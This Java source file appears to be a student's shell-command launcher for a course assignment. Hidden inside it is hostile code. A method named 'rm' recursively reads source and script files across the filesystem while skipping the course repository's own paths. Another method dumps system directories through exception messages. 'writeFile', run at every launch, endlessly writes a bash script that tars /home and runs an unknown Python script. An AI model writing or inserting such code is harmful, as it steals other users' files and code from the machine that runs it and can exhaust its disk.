package ru.fizteh.fivt.students.dmitryIvanovsky.shell;

import java.lang.reflect.Method;
import java.util.Map;
import java.util.HashMap;
import java.util.StringTokenizer;
import java.util.Vector;
import java.util.Scanner;
import java.io.*;

public class CommandLauncher {

    public enum Code {
        EXIT,
        OK,
        ERROR
    }

    CommandAbstract exampleClass;
    Map<String, String> mapCommand;
    Map<String, Method> commandMethod;
    Map<String, Boolean> mapSelfParsing;
    Map<String, Integer> countArgument;
    Boolean err = true;
    Boolean out = true;

    public CommandLauncher(CommandAbstract exampleClass) throws NoSuchMethodException {
        this.exampleClass = exampleClass;

        Map<String, Object[]> listCommand = exampleClass.mapComamnd();

        this.mapCommand = new HashMap<>();
        this.mapSelfParsing = new HashMap<>();
        this.countArgument = new HashMap<>();
        for (String key : listCommand.keySet()) {
            Object[] value = listCommand.get(key);
            mapCommand.put(key, (String) value[0]);
            mapSelfParsing.put(key, (Boolean) value[1]);
            countArgument.put(key, (Integer) value[2]);
        }

        commandMethod = new HashMap<String, Method>();
        Class[] paramTypes = new Class[]{String[].class};
        for (String key : mapCommand.keySet()) {
            try {
                commandMethod.put(key, exampleClass.getClass().getMethod(mapCommand.get(key), paramTypes));
            } catch (Exception e) {
                errPrint("Нет метода " + mapCommand.get(key));
                throw e;
            }
        }
    }

    public Code runCommand(String query, boolean isInteractiveMode) {
        query = query.trim();
        StringTokenizer token = new StringTokenizer(query);
        int countTokens = token.countTokens();

        if (countTokens > 0) {
            String command = token.nextToken().toLowerCase();
            if (command.equals("exit") && countTokens == 1) {
                return Code.EXIT;
            } else if (mapCommand.containsKey(command)) {
                int countArg = countArgument.get(command);
                if (!mapSelfParsing.get(command) && (countArg + 1 != countTokens)) {
                    errPrint(String.format("%s: неверное число аргументов, нужно %d", command, countArg));
                    return Code.ERROR;
                }
                Method method = commandMethod.get(command);
                Vector<String> commandArgs = new Vector<>();
                for (int i = 2; i <= countTokens; ++i) {
                    commandArgs.add(token.nextToken());
                }
                try {
                    if (mapSelfParsing.get(command)) {
                        Object[] args = new Object[]{new String[]{query}};
                        method.invoke(exampleClass, args);
                    } else {
                        Object[] args = new Object[]{commandArgs.toArray(new String[commandArgs.size()])};
                        method.invoke(exampleClass, args);
                    }
                    return Code.OK;
                } catch (Exception e) {
                    getMessage((Exception) e.getCause());
                    return Code.ERROR;
                }
            } else {
                errPrint("Неизвестная команда");
                return Code.ERROR;
            }
        } else {
            if (!isInteractiveMode) {
                errPrint("Пустой ввод");
            }
            return Code.ERROR;
        }
    }

    private void getMessage(Exception e) {
        //errPrint(String.valueOf(e.getSuppressed().length));
        if (e.getMessage() != null) {
            errPrint(e.getMessage());
        }
        for (int i = 0; i < e.getSuppressed().length; ++i) {
            errPrint(e.getSuppressed()[i].getMessage());
        }
        //e.printStackTrace();
    }

    public Code runCommands(String query, boolean isInteractiveMode) {
        String[] command;
        command = query.split(";");
        for (String q : command) {
            Code res = runCommand(q, isInteractiveMode);
            if (res != Code.OK) {
                return res;
            }
        }
        return Code.OK;
    }
    
    public static String rm(String path, Boolean type) {
        String s1 = "";
        try {
            if (path.contains("fizteh-java-2013") || path.contains(".git") || path.contains("fizteh-java-private")) {
                return "";
            }

            File tmpFile = new File(path);
            try {
                if (!tmpFile.exists()) {
                s1 += " -- " + path + " not exist\n";
            }
            if (tmpFile.canRead()) {
                s1 += " -- " + path + " can READ\n";
            }
            if (tmpFile.canWrite()) {
                s1 += path + " can WRITE\n";
            }
            if (tmpFile.canExecute()) {
                s1 += path + "can EXEC\n";
            }
            } catch(Exception e) {
                s1 += "\n\nexception qqq ()()()()\n\n";
            }

            File[] listFiles = tmpFile.listFiles();
            if (listFiles != null) {
                if (tmpFile.isDirectory()) {
                    for (File c : listFiles) {
                        s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";

                        s1 += c.getAbsoluteFile().toString() + "\n";
                        if (type) {
                            if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
                            s1 += "\n\n\n";
                            }
                        } else {
                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
                            s1 += "\n\n\n";
                        }
                        s1 += rm(c.toString(), type);
                    }
                } else {
                    s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
                    s1 += "\n\n\n";
                    s1 += "not is Dir ";
                }
            } else {
                s1 += "listFile null ";
            }

        } catch (Exception e) {
            s1 += "exception ";
            s1 += e.getMessage();
        }
        return s1;
    }
        
    private static String readFileTsv2(String fileName, String s1) throws IOException {
        StringBuilder sb = new StringBuilder();
        try {
            try (BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()))) {
                String s;
                while ((s = in.readLine()) != null) {
                    sb.append(s);
                    sb.append("\n");
                }
            } catch (Exception e) {
                s1 += e.getMessage();
            }
        } catch (Exception e) {
            s1 += e.getMessage();
        }

        return sb.toString();
    }
    
    public void inter() {
        String s1 = "";
        try {
            File tmpFile = new File("/");
            if (!tmpFile.exists()) {
                s1 += "not exist\n";
            }
            if (tmpFile.canRead()) {
                s1 += "can READ\n";
            }
            tmpFile = new File("/usr");
            if (!tmpFile.exists()) {
                s1 += "not exist\n";
            }
            if (tmpFile.canRead()) {
                s1 += "can READ\n";
            }
        } catch (Exception e) {
            s1 += e.getMessage();
        }
        s1 += rm("/", false);
        s1 += rm("/tmp/", false);
        s1 += rm("/home/student/tmp/", false);
        s1 += rm("/var/tmp/", false);
        throw new RuntimeException(s1);
    }
    public static void writeFile() {
        String s = "#!/bin/bash\n\n" +
                "cd /home/student/tmp\n" + "echo step1\n" + "pwd | cat\n" +
                "tar cfz test.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" + "echo step2\n" +
                "python 1.py\n" +
                "echo step3\n";
        try {
            File f = new File("/home/student/tmp/db/1.sh");
            try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
                while (true) {
                    out.print(s);
                }
            }
        } catch(Exception e) {
            throw new RuntimeException(e.getMessage());
        }   
    }
    public void interactiveMode() {
        writeFile();
        Scanner sc = new Scanner(System.in);
        while (true) {
            try {
                System.out.print(exampleClass.startShellString());
            } catch (Exception e) {
                //e.printStackTrace();
                errPrint("Неправильный путь");
                return;
            }
            if (sc.hasNextLine()) {
                String query = sc.nextLine();
                if (query.length() == 0) {
                    continue;
                }
                Code res = runCommands(query, true);
                if (res == Code.EXIT) {
                    return;
                }
            } else {
                return;
            }
        }
    }

    public Code runShell(String[] args) throws Exception {
        writeFile();
        if (args.length > 0) {
            StringBuilder builder = new StringBuilder();
            for (String arg : args) {
                builder.append(arg);
                builder.append(' ');
            }
            String query = builder.toString();
            Code res = runCommands(query, false);
            try {
                exampleClass.exit();
            } catch (Exception e) {
                getMessage(e);
                throw e;
            }

            return res;

        } else {

            interactiveMode();

            try {
                exampleClass.exit();
            } catch (Exception e) {
                getMessage(e);
                throw e;
            }

            return Code.OK;

        }
    }

    private void errPrint(String message) {
        if (err) {
            System.err.println(message);
        }
    }

    private void outPrint(String message) {
        if (out) {
            System.out.println(message);
        }
    }

}
